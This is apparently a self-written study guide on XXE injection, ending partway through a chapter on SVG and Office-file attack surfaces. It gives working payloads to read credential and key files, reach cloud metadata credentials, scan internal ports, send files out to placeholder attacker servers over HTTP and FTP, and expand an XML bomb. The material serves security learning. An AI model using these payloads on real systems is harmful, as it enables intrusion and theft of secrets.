# XML External Entity (XXE) Injection
### Everything I Learned — So I Can Come Back After a Year and Remember It All

# CHAPTER 0 — How to Read This Book

This book is structured in layers. Each layer builds on the previous one. Don't skip.

- **Chapter 1:** What is XML? (the data format itself — must understand deeply)
- **Chapter 2:** DTDs and Entities (the feature that makes XXE possible)
- **Chapter 3:** The Vulnerability — exactly why and how it works
- **Chapter 4:** Classic XXE attacks — reading files, SSRF, port scanning
- **Chapter 5:** Blind XXE — when the server doesn't show you data
- **Chapter 6:** Escalating attacks — parameter entities, external DTDs, CDATA, PHP wrappers, FTP
- **Chapter 7:** Hidden attack surfaces — SVG, DOCX, content-type tricks, XInclude
- **Chapter 8:** The full XML attack family — not just XXE (XML injection, XPath, XSLT, DoS)
- **Chapter 9:** How to hunt XXE like a researcher (methodology, not checklist)
- **Chapter 10:** Writing real bug reports
- **Chapter 11:** Prevention — how defenders fix it (makes you understand the bug better)
- **Chapter 12:** Master payload reference

---

# CHAPTER 1 — XML: The Foundation You Must Understand

## 1.1 What is XML and Why Does It Exist?

XML stands for **Extensible Markup Language**. It was created in 1998 as a standard way for software systems to exchange data in a human-readable, structured format.

The keyword is **data exchange**. HTML displays things in a browser. XML moves data between systems.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
  <customer>
    <name>Arjun Sharma</name>
    <email>arjun@example.com</email>
  </customer>
  <items>
    <item id="1">
      <product>Laptop</product>
      <quantity>1</quantity>
      <price>75000</price>
    </item>
  </items>
  <total>75000</total>
</order>
```

This is self-describing. Any system receiving this knows exactly what it is looking at. No schema needed ahead of time.

## 1.2 XML Structure — The Rules

You must know these because understanding why payloads are constructed the way they are depends on knowing the syntax rules.

**Declaration line** — always first:
```xml
<?xml version="1.0" encoding="UTF-8"?>
```

**Tags** — every opening tag has a closing tag:
```xml
<username>arjun</username>
```

**Root element** — there is exactly ONE root element that wraps everything:
```xml
<root>
  <!-- everything goes inside the root -->
</root>
```

**Attributes** — key-value pairs inside opening tags:
```xml
<user id="42" role="admin">content</user>
```

**Nesting** — tags must be properly closed in reverse order:
```xml
<!-- CORRECT -->
<a><b><c>text</c></b></a>

<!-- WRONG — overlapping tags -->
<a><b><c>text</a></b></c>
```

**Special characters that MUST be escaped:**

| Character | Meaning in XML | Escape with |
|-----------|----------------|-------------|
| `<` | Opens a tag | `&lt;` |
| `>` | Closes a tag | `&gt;` |
| `&` | Starts an entity | `&amp;` |
| `"` | Attribute delimiter | `&quot;` |
| `'` | Attribute delimiter | `&apos;` |

This matters for exploitation later. When you're trying to exfiltrate files that *contain* these characters, the XML will break. We'll come back to how to solve that.

## 1.3 Where XML Is Actually Used (Attack Surface)

This is not trivia. Knowing where XML lives means knowing where to look for XXE.

**Authentication — SAML:**
SAML (Security Assertion Markup Language) is the backbone of enterprise SSO — "Login with your company account". When you click "Login with Google" or "Login with Microsoft", a SAML response is often an XML document sent between the identity provider and the application. This document contains your identity assertions. It is XML. It gets parsed. It is a major XXE hunting ground.

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>arjun</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="role">
    <saml:AttributeValue>user</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

**Web services — SOAP:**
SOAP (Simple Object Access Protocol) is an older but still very widely used protocol for web services, especially in enterprise software — banking, insurance, healthcare, ERP systems. Every SOAP request and response is XML. These systems are goldmines for XXE because they tend to be old codebases with old parsers.

**File formats that ARE XML underneath:**

| Format | Extension | What the app does with it |
|--------|-----------|--------------------------|
| Word Document | `.docx` | Content extraction, preview, indexing |
| Excel Spreadsheet | `.xlsx` | Import, processing, charting |
| PowerPoint | `.pptx` | Conversion, rendering, preview |
| SVG Image | `.svg` | Rendering, thumbnail generation |
| RSS/Atom Feed | `.xml`, `.rss` | Feed aggregation |
| GPX | `.gpx` | GPS data import |
| OpenDocument | `.odt`, `.ods` | Office suite processing |

When a developer builds a "upload your resume" feature and uses a DOCX parser, they probably never thought "the DOCX could contain a malicious DTD that reads /etc/passwd." But it can. And that's what you're going to learn to exploit.

**HTTP request bodies:**
Any endpoint that accepts XML in the request body. These are often in API endpoints, especially older REST APIs and any SOAP endpoint.

## 1.4 The Anatomy of an XML Document as a Parser Sees It

This mental model is important. When a server receives your XML, here's the sequence:

1. Lexer breaks the text into tokens (tags, text, entities, etc.)
2. Parser builds a tree structure (the DOM — Document Object Model)
3. **DTD is processed** — entities are declared, external resources may be fetched
4. **Entity references are resolved** — `&something;` gets replaced with its value
5. Application code reads the tree and does whatever it does

Step 3 and 4 are where XXE happens. The application developer is thinking about step 5. They're not thinking about what the parser does with entities before the data reaches their code.

---

# CHAPTER 2 — DTDs and Entities: The Feature Behind the Bug

## 2.1 What is a DTD?

A **Document Type Definition** defines the structure and the building blocks of an XML document. It can:
- Define which elements are allowed
- Define which attributes elements can have
- Define **entities** (the thing we care about most for XXE)

A DTD can be **internal** (defined inline in the XML document) or **external** (loaded from a separate file via URL).

**Internal DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE myapp [
  <!ELEMENT myapp ANY>
  <!ENTITY greeting "Hello World">
]>
<myapp>&greeting;</myapp>
```

The `<!DOCTYPE myapp [...]>` block is the internal DTD. Everything inside the square brackets is the DTD content.

**External DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE myapp SYSTEM "http://myapp.com/myapp.dtd">
<myapp>content</myapp>
```

The parser fetches the DTD from the given URL before processing the rest of the document. This is already a potential SSRF right here — but more on that later.

## 2.2 Internal Entities — Variables in XML

An entity is essentially a variable. You define it once, reference it many times.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY company "Infosec Labs Pvt Ltd">
  <!ENTITY year "2024">
]>
<report>
  <title>Security Report by &company; for &year;</title>
  <footer>Copyright &year; &company;</footer>
</report>
```

When parsed, every `&company;` becomes `"Infosec Labs Pvt Ltd"` and every `&year;` becomes `"2024"`. The parser does this substitution before the application ever sees the data.

These are harmless. This feature is useful.

## 2.3 External Entities — The Dangerous Kind

This is where XXE begins.

External entities use the `SYSTEM` keyword to say: "the value of this entity is the content of this URL or file path."

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY myfile SYSTEM "file:///etc/passwd">
]>
<data>&myfile;</data>
```

When the parser sees `<!ENTITY myfile SYSTEM "file:///etc/passwd">`, it reads the file at that path and substitutes its contents everywhere `&myfile;` appears.

The `SYSTEM` keyword accepts:
- `file:///path/to/file` — local filesystem files
- `http://someserver/path` — HTTP requests
- `https://someserver/path` — HTTPS requests
- `ftp://someserver/file` — FTP resources
- `php://filter/...` — PHP stream wrappers (if running PHP)

There is also a `PUBLIC` variant:
```xml
<!ENTITY myfile PUBLIC "some-identifier" "file:///etc/passwd">
```

The `PUBLIC` identifier is a formal public identifier string (originally meant for DTD registries). For our purposes in exploitation, it does the same thing as `SYSTEM`. Some parsers that block `SYSTEM` might allow `PUBLIC`, so trying both is good practice.

## 2.4 Parameter Entities — The Advanced Kind

There are two types of XML entities:

**General entities** — referenced in the document body using `&name;`
```xml
<!ENTITY foo "bar">
...
<element>&foo;</element>
```

**Parameter entities** — referenced only within DTD declarations using `%name;`
```xml
<!ENTITY % foo "bar">
...in DTD only...
%foo;
```

Parameter entities are declared with `%` and referenced with `%`. They can only be used inside DTD markup, not in the document body itself.

**Why do parameter entities matter for XXE?**

Because the XML specification has a restriction: inside an inline DTD, general entities cannot reference other general entities. This breaks the naive approach to blind XXE. Parameter entities are the workaround. This is covered in depth in Chapter 6.

## 2.5 How Parsers Process This: The Internal Mechanism

Understanding this process is what separates copy-paste hackers from researchers who *understand* what they're doing.

When a parser encounters `<!ENTITY foo SYSTEM "file:///etc/passwd">`:

1. Parser sees `SYSTEM` keyword — flags this as an external entity
2. Parser sees the URL/path `file:///etc/passwd`
3. Parser uses the OS file I/O or network stack to fetch that resource
4. The fetched content is stored as the value of entity `foo`
5. Wherever `&foo;` appears, that content is substituted in

The parser does this *before the application code sees anything*. The application developer wrote code to handle the values in the XML tags. They never see the entity declaration. By the time their code runs, `&foo;` has already been replaced with the contents of `/etc/passwd`.

This is why XXE is so powerful — it happens at the parser level, completely transparent to the application logic.

---

# CHAPTER 3 — The Vulnerability: Exactly Why It Breaks

## 3.1 The Root Cause

There are three conditions for XXE to exist:

1. **The application accepts XML input** (or embeds user input into XML)
2. **The XML parser has external entity resolution enabled** (many do by default)
3. **The user can control the DTD content** (directly or through input in the XML)

That's it. All three conditions together = XXE vulnerability.

Most XML parsers were written in the late 1990s and early 2000s. External entity resolution was considered a useful feature. "Least privilege" was not baked into the design. These parsers enabled everything by default. Many applications use them without ever changing the defaults.

## 3.2 The Trust Chain That Breaks

Here is the flawed trust chain:

```
User → Application → XML Parser → File System / Network
 ↑                                        ↓
 └──────────────── Data returned ─────────┘
```

The user says: "here is my XML document." The application says: "I'll parse this XML document." The XML parser says: "this document tells me to read /etc/passwd, so I will." The file system says: "here are the contents." The parser puts those contents into the document. The application returns the document to the user.

Nobody in this chain asked: "should we trust what the user put in the DTD?"

## 3.3 Classic Vulnerable Pattern

Here's a real vulnerable code pattern (Java):

```java
// VULNERABLE CODE
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(userSuppliedXml)));
String value = doc.getElementsByTagName("data").item(0).getTextContent();
return value;
```

The developer's intention: parse the user's XML and read the `<data>` tag. What they don't know: if the user puts a malicious DTD in the XML, the parser will resolve external entities before their code even reads the `<data>` tag. By the time `getTextContent()` is called, `&malicious;` has already been replaced with `/etc/passwd` contents. The developer returns it thinking they're returning user data.

## 3.4 Why Dependencies Make This Worse

Many XXE vulnerabilities come not from the developer's code but from libraries and frameworks they use. A developer might:
- Use a PDF generation library that internally parses XML templates
- Use an SVG rendering library that parses SVG files (which are XML)
- Use an office document parser for "import from Word" features
- Use a SAML library for SSO integration

All of these libraries might use their own XML parser internally, with external entity resolution enabled. The developer never wrote an XML parser and never thought about XXE. But their library uses one.

This is why XXE persists even though it's well-known. The developer didn't write the vulnerable code — a library did.

---

# CHAPTER 4 — Classic XXE Attacks

## 4.1 Reading Local Files

The simplest and most impactful attack. Make the parser read a file on the server's filesystem.

### Basic file read:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

The parser reads `/etc/passwd` and substitutes it into the `<data>` element. The application returns the element's value, and you see the file contents.

### What `/etc/passwd` looks like:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
arjun:x:1001:1001::/home/arjun:/bin/bash
```

The format is: `username:password:UID:GID:comment:home_dir:shell`

The `x` in the password field means the actual password hash is in `/etc/shadow`.

### The target file progression (escalate in this order):

**Start harmless — confirm the bug:**
```xml
<!ENTITY file SYSTEM "file:///etc/hostname">
```
Just returns the server's hostname. Safe, non-sensitive, confirms the bug is real.

**Confirm users on the system:**
```xml
<!ENTITY file SYSTEM "file:///etc/passwd">
```

**Get hashed passwords (requires root-level access in most configs):**
```xml
<!ENTITY file SYSTEM "file:///etc/shadow">
```
`/etc/shadow` is only readable by root or the shadow group. If the web server runs as root (misconfiguration), you get this. Contents look like:
```
root:$6$rounds=5000$salt$hashedpassword...:18000:0:99999:7:::
arjun:$6$rounds=5000$salt$hashedpassword...:18500:0:99999:7:::
```

**Get command history — often has passwords in plaintext:**
```xml
<!ENTITY file SYSTEM "file:///root/.bash_history">
<!ENTITY file SYSTEM "file:////home/arjun/.bash_history">
```

Developers and sysadmins run commands like:
```
mysql -u root -pSuperSecretPassword123 myapp_db
aws s3 cp s3://private-bucket/ ./
curl -H "Authorization: Bearer eyJhbGc..." https://api.internal/admin
```

All of that gets written to `.bash_history`. Reading this file can reveal passwords, internal URLs, API keys, and deployment scripts.

**SSH private keys:**
```xml
<!ENTITY file SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY file SYSTEM "file:////home/arjun/.ssh/id_rsa">
```

If you get a private key, you can SSH directly into the server.

**Environment variables — often has API keys and secrets:**
```xml
<!ENTITY file SYSTEM "file:///proc/self/environ">
```

The `/proc/self/environ` file contains the environment variables of the running process. In Docker containers, secrets are often passed as environment variables:
```
DATABASE_URL=postgres://user:password@db:5432/myapp
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_abcdefghijklmnop
```

**Application source code:**
```xml
<!ENTITY file SYSTEM "file:///var/www/html/config.php">
<!ENTITY file SYSTEM "file:///var/www/html/database.yml">
<!ENTITY file SYSTEM "file:///app/config/secrets.yml">
```

Database credentials, API keys, secret tokens — all in config files.

**Network configuration:**
```xml
<!ENTITY file SYSTEM "file:///etc/hosts">
<!ENTITY file SYSTEM "file:///etc/resolv.conf">
```

These reveal internal hostnames and DNS servers — helps map the internal network.

**Windows targets:**
```xml
<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY file SYSTEM "file:///c:/windows/win.ini">
```

### The `PUBLIC` alternative:

Some parsers that block `SYSTEM` allow `PUBLIC`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file PUBLIC "some-random-string" "file:///etc/passwd">
]>
<data>&file;</data>
```

Always try `PUBLIC` if `SYSTEM` fails.

## 4.2 XXE to SSRF (Server-Side Request Forgery)

When you use `http://` instead of `file://`, the server makes an outbound HTTP request. You've turned the server into a proxy. This is SSRF via XXE.

### Why this is powerful:

The server can reach things you can't:
- Internal services behind the firewall (admin panels, databases, cache servers)
- The cloud metadata service (AWS, GCP, Azure)
- Internal API endpoints that aren't exposed to the internet
- Other servers on the internal network

### Basic SSRF payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY ssrf SYSTEM "http://internal-admin.company.com/dashboard">
]>
<data>&ssrf;</data>
```

The application's response will contain the content of `internal-admin.company.com/dashboard` — which you normally can't reach.

### Cloud metadata — this is critical:

Every major cloud provider has an internal metadata service at a well-known IP address that only the server itself can reach:

**AWS EC2 metadata:**
```xml
<!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/">
```

This returns a list of available endpoints. Then you navigate:
```xml
<!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

This returns the name of the IAM role. Then:
```xml
<!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole">
```

This returns:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "AQoXnyc4...",
  "Expiration": "2024-01-01T12:00:00Z"
}
```

These are temporary credentials for the EC2 instance's IAM role. With these, you can:
- List and download S3 buckets
- Query RDS databases
- Access other AWS services the role has permission for

This is a complete cloud account compromise starting from an XXE.

**GCP metadata:**
```xml
<!ENTITY gcp SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

**Azure metadata:**
```xml
<!ENTITY azure SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

### Internal port scanning via XXE:

By making requests to different ports and observing whether the server responds with content, an error, or a timeout, you can map what's running on the internal network.

```xml
<!-- Does port 8080 respond? -->
<!ENTITY scan SYSTEM "http://127.0.0.1:8080/">

<!-- Is MySQL running? -->
<!ENTITY scan SYSTEM "http://127.0.0.1:3306/">

<!-- Is Redis running? -->
<!ENTITY scan SYSTEM "http://127.0.0.1:6379/">

<!-- Is MongoDB running? -->
<!ENTITY scan SYSTEM "http://127.0.0.1:27017/">
```

Observe the difference:
- Port with a running service: response may contain a banner or response data
- Port that's closed: you get a "connection refused" error
- Firewall-blocked port: you get a timeout (slower response)

You can use this to build a map of what's running internally, then target those services further.

## 4.3 Denial of Service: XML Bomb / Billion Laughs

This is a DoS attack using only internal entities — no external entities required.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ELEMENT bomb ANY>
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<bomb>&lol9;</bomb>
```

**How the math works:**
- `lol` = 3 bytes ("lol")
- `lol1` = 10 references to `lol` = 30 bytes
- `lol2` = 10 references to `lol1` = 300 bytes
- `lol3` = 3,000 bytes
- `lol4` = 30,000 bytes
- ...
- `lol9` = 3,000,000,000 bytes (3 GB)

The XML input is only a few hundred bytes. When parsed, it tries to expand to 3GB in memory. The server runs out of memory and crashes.

> ⚠️ **NEVER test this on a live target.** This causes actual service disruption and financial harm. It violates bug bounty policies. Just understand it theoretically. In a report, mention that DoS *would be possible* without actually triggering it.

**Quadratic Blowup (a stealthier variant):**

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY x "AAAA...55000 A characters...AAAA">
]>
<bomb>&x;&x;&x;...55000 references...&x;</bomb>
```

One entity of 55,000 chars, referenced 55,000 times = 55,000 × 55,000 = ~3 billion chars. The document is ~200KB (under file size limits), but expands to ~2.5GB. This avoids the nested-entity depth limits some parsers enforce against Billion Laughs.

---

# CHAPTER 5 — Blind XXE: When the Server Stays Silent

## 5.1 What is Blind XXE and Why It's More Common

In classic XXE, the server parses your XML and includes the entity's value in the response you see. You directly read the file from the HTTP response.

**Blind XXE** is when:
- The server parses your XML (so the bug exists)
- But the parsed data is NOT returned in the response

This is more common in real applications because:
- Many endpoints accept XML for processing (configuration, import, upload) but don't echo it back
- Modern APIs might return a success/error code, not the full parsed document
- Background processing queues — the XML is parsed asynchronously

You can't read files directly. But you can still exfiltrate data.

## 5.2 Confirming Blind XXE with Out-of-Band DNS/HTTP

The first question: can the server make outbound connections?

**Setup your listener first:**
- Use Burp Suite Collaborator (in Burp Pro)
- Use `interactsh` (free, open source): `interactsh-client`
- Use your own VPS: `nc -lvnp 80`

**Payload to trigger an outbound connection:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-DOMAIN/xxe-test">
]>
<data>&xxe;</data>
```

If you see a DNS lookup or HTTP GET request hit your listener, the server made an outbound connection. Blind XXE is confirmed even though you saw nothing in the response.

**Try port 80 and 443 first** — firewalls often block other ports for outbound connections.

**Also try DNS-only detection:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://xxe-probe.YOUR-COLLABORATOR-DOMAIN/">
]>
<data>&xxe;</data>
```

Even if HTTP is blocked, DNS lookups often succeed. A DNS lookup in your listener confirms the parser is processing external entities.

## 5.3 Understanding Why Naïve Blind XXE Doesn't Work

You might think the payload for blind exfiltration would be:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY exfil SYSTEM "http://your-server/?data=&file;">
]>
<data>&exfil;</data>
```

This **does not work**. Here's the exact reason:

The XML specification says: when processing an inline DTD (the DTD defined inside `<!DOCTYPE ... [...]>`), general external entities **cannot reference other general entities** in their definition. The parser will reject the `&file;` reference inside the definition of `exfil`.

Specifically, this line:
```xml
<!ENTITY exfil SYSTEM "http://your-server/?data=&file;">
```

...is invalid in an inline DTD because `&file;` references another entity in an entity's system identifier. The parser stops here.

This is why the naive approach fails, and why we need parameter entities and external DTDs.

## 5.4 Parameter Entities — The Key to Blind XXE

**Parameter entities** can be referenced within DTD declarations. They're declared with `%` and referenced with `%`.

```xml
<!ENTITY % myparameterentity "the value">
...
%myparameterentity;
```

The important difference: in an **external DTD** (a DTD hosted on a separate server), parameter entities CAN reference other parameter entities in their declarations. This restriction only applies to inline DTDs.

This is the loophole we exploit.

## 5.5 The Complete Blind XXE Exfiltration Attack

### Step 1: Host your malicious external DTD

Create a file called `evil.dtd` on a server you control:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?content=%file;'>">
%wrap;
%exfil;
```

**Line-by-line explanation:**

Line 1: `<!ENTITY % file SYSTEM "file:///etc/passwd">`
— Declare a parameter entity `%file;` whose value is the contents of `/etc/passwd` on the target server.

Line 2: `<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?content=%file;'>">`
— Declare a parameter entity `%wrap;` whose value is *another entity declaration*. The `&#x25;` is the hex-encoded `%` sign. We must encode it because using a literal `%` inside an entity value would break the XML parsing. When expanded, `%wrap;` creates a new parameter entity declaration for `%exfil;` that points to your server with the file contents in the URL.

Line 3: `%wrap;`
— Execute the `%wrap;` entity, which dynamically declares the `%exfil;` entity.

Line 4: `%exfil;`
— Execute the `%exfil;` entity, which triggers the HTTP request to your server with the file contents in the URL parameter.

### Step 2: Trigger the target to load your DTD

Send this XML to the vulnerable endpoint:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<foo>anything</foo>
```

**What happens:**
1. Target parses your XML
2. Target sees `%dtd;` declared with your server URL
3. Target fetches `evil.dtd` from your server (you see this request in your logs)
4. Target processes the contents of your DTD
5. `%file;` is declared (reads `/etc/passwd` on target)
6. `%wrap;` is executed (declares `%exfil;` with the file contents baked into the URL)
7. `%exfil;` is executed (makes HTTP GET request to `http://YOUR-SERVER/?content=root:x:0:0...`)
8. You see the request hit your server and read the file contents from the URL parameter

### Step 3: Read the data from your server logs

Your access log will contain something like:
```
GET /?content=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon... HTTP/1.1
```

The `%0A` characters are URL-encoded newlines. Decode the URL encoding and you have the file.

### Important limitation:

This technique can only exfiltrate **one line at a time** from files with newlines, because the newline character `\n` in the URL will break the HTTP request (HTTP headers are newline-delimited). For multi-line files like `/etc/passwd`, you need the CDATA technique (Chapter 6) or the error-based technique (Chapter 5.6).

## 5.6 Error-Based Blind XXE (When You Can't Receive Callbacks)

If the target can't make outbound HTTP connections (locked-down network), but you can see error messages in the response, use error-based exfiltration.

**Host on your server (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%wrap;
%error;
```

**The trick:** Reference the file contents as part of a `file://` path to a file that doesn't exist. The parser will try to open the file, fail, and include the attempted path in the error message.

**The error the application returns:**
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

The file contents appear in the error path. You don't need any outbound connection from the target.

---

# CHAPTER 6 — Escalating: Advanced Exfiltration Techniques

## 6.1 Repurposing Local DTDs (When Outbound Connections Are Blocked)

What if the target:
- Can't make outbound connections (no callback possible)
- Doesn't show error messages (no error-based exfil)

There's still a way, if the target system has a DTD file somewhere on its local filesystem.

**The technique: override a local DTD's entity**

Many Linux systems (especially those with GNOME/KDE) have XML DTD files installed at known paths. For example:
```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/yelp/dtd/docbookx.dtd  
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
```

If a local DTD file defines a parameter entity, you can override that entity in your inline DTD and inject your malicious declaration.

**Step 1:** Find a DTD file on the target system by trying common paths.

**Step 2:** Look for parameter entities it defines.

**Step 3:** Override that entity in your inline DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>bar</foo>
```

This is advanced. The idea is:
- Load a local DTD file that you know exists
- Override a parameter entity it defines (here, `ISOamsa`)
- Your override contains the error-based exfiltration payload
- When the local DTD is processed, it evaluates your overridden entity, which triggers the error

This completely bypasses the need for outbound connections.

## 6.2 CDATA Wrapping for Special Characters

**The problem:** Files like XML config files, PHP files, HTML files, and source code contain XML special characters (`<`, `>`, `&`). If you try to include them directly via XXE, the parser chokes on them and the exfiltration breaks.

**The solution:** Wrap the file contents in a `CDATA` section. Inside CDATA, ALL characters are treated as raw text — no parsing, no interpretation:

```xml
<![CDATA[ anything can go here, even <tags> & "quotes" ]]>
```

**The challenge:** You can't have a CDATA section span multiple entity references. You need to construct it dynamically.

**External DTD (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/config.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrap "<!ENTITY &#x25; exfil
  'http://YOUR-SERVER/?data=%start;%file;%end;'>">
%wrap;
%exfil;
```

The constructed URL becomes:
```
http://YOUR-SERVER/?data=<![CDATA[file contents with <tags> & stuff]]>
```

The CDATA wrapper prevents the XML parser from interpreting the special characters in the file.

## 6.3 PHP Filter Wrapper

If the target is a PHP application, PHP's stream wrappers give you additional power.

**Base64-encode the file before exfiltration:**
```xml
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

The file contents are base64-encoded before being put into the entity value. This:
- Sidesteps ALL special character issues (base64 is URL-safe)
- Works for binary files (images, compiled code, etc.)
- Works for XML files with XML syntax inside them
- Lets you read PHP source code without the server executing it

You receive a base64 string. Decode it:
```bash
echo "cm9vdDp4OjA6MDpy..." | base64 -d
```

**Other useful PHP wrappers:**
```xml
<!-- Read PHP source without execution -->
php://filter/convert.base64-encode/resource=/var/www/html/index.php

<!-- Combine multiple filters -->
php://filter/read=string.toupper|convert.base64-encode/resource=/etc/passwd
```

## 6.4 FTP Exfiltration (Bypassing HTTP Restrictions)

HTTP URLs have two problems:
1. Newlines in file contents break the HTTP request (HTTP is line-delimited)
2. Many characters are not legal in HTTP URL parameters

FTP has fewer restrictions. Multi-line files can be sent over FTP without newline issues.

**Run an FTP server on your machine.** Use this Ruby script (or equivalent):
```ruby
# xxe-ftp-server.rb
require 'socket'
server = TCPServer.new(2121)
loop do
  client = server.accept
  client.puts "220 FTP Server Ready"
  data = ""
  while line = client.gets
    data += line
    break if line.start_with?("QUIT")
  end
  puts "Received: #{data}"
  client.close
end
```

**Malicious DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR-SERVER:2121/?%file;'>">
%wrap;
%exfil;
```

The file contents (including newlines) are sent over FTP rather than HTTP. You receive the complete multi-line file.

---

# CHAPTER 7 — Hidden Attack Surfaces

## 7.1 SVG File Uploads

SVG (Scalable Vector Graphics) is XML. Every time a web application accepts SVG uploads (profile pictures, icon uploads, drawing tools), it's accepting XML.

If the application processes (renders, converts, optimizes) the SVG server-side, it will parse the XML with a parser that may have external entity resolution enabled.

**Normal SVG file:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
</svg>
```

**Malicious SVG with XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <text font-size="10" x="0" y="20">&xxe;</text>
</svg>
```

If the server renders this to PNG/PDF and returns it, the rendered image will contain the text of `/etc/passwd`.

If the server processes the SVG without rendering it (just validates, optimizes, or stores it), use blind XXE with a callback instead.

**Common SVG processing scenarios:**
- Profile picture / avatar upload
- "Export as SVG" import feature  
- Drawing/diagram tools that accept SVG
- Email signature image upload
- Logo upload in business software

## 7.2 Office Document File Uploads (DOCX, XLSX, PPTX)

These formats are ZIP archives containing XML. You can unzip them, inject your payload, and rezip.

**Unzip a DOCX:**
```bash
unzip document.docx -d docx_unpacked
ls docx_unpacked/
# You'll see: word/, _rels/, [Content_Types].xml, etc.
ls docx_unpacked/word/
# document.xml, styles.xml, settings.xml, etc.
```

**The main XML file to inject into:**
- DOCX: `word/document.xml`
- XLSX: `xl/workbook.xml`
- PPTX: `ppt/presentation.xml`

**Open `word/document.xml` and add the XXE payload at the top, before the root element:**
```xml
